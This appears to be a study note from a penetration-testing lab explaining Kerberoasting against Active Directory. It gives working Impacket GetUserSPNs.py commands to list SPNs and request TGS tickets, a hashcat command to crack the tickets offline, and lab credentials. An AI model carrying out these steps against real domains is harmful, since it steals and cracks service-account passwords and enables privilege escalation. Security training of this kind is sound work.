 `We will use the following credentials: User=forend and password=Klmcargo2`
## What is Kerberoasting (in simple words)?

Think of a company’s internal network (Active Directory) like a big office where:

- 🧍Users = Employees
- 🖥️ Services (like SQL, IIS, etc.) = Office machines
- 🔑 Kerberos = Security guard that hands out keys to access those services

Some office machines are assigned to specific employees (via SPNs – Service Principal Names). The Kerberos guard will give out a special encrypted **service ticket** (TGS) if you ask for one of these services.

But here's the problem:

> The service ticket is **encrypted using the password of the user who runs the service**. So if we can grab this ticket, we can try to **crack it offline** to get the **user’s password** – often this user is a service account with high privileges. This is **Kerberoasting**.

---

## 🧰 What do you need before running Kerberoasting?

✅ You must have **valid domain user credentials**  
✅ You must be **able to query the domain controller**  
✅ You want to **find accounts that have SPNs set** (meaning they're running services


#  **Step-by-Step Attack From Linux (Using Impacket)**

### 1.  **Install Impacket**
```bash
git clone https://github.com/fortra/impacket
cd impacket
sudo python3 -m pip install .
```
### 2.  **List SPNs (Service Accounts)**
```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME>

# example
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

✅ You’ll be prompted for the password  
✅ This will list service accounts like:

- `MSSQLSvc/SERVER.DOMAIN.LOCAL:1433`
- `backupjob/SERVER.DOMAIN.LOCAL`

📌 **Check if any are Domain Admins!** Those are jackpot targets.


## 3.  **Request All TGS Ticket**
```bash

# **Request All TGS Tickets (for all SPNs)**
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -request

# Request Ticket for a Specific Account (Optiona)
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -request-user <TARGET_ACCOUNT>
#example
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile sapservice_tgs
```


## 4.  **Crack the TGS Ticket (Offline)**

```bash
hashcat -m 13100 hash.txt /path/to/wordlist.txt
```
Where:
- `-m 13100` is the mode for Kerberos 5 TGS-REP
- `hash.txt` contains the `$krb5tgs$...` ticket(s)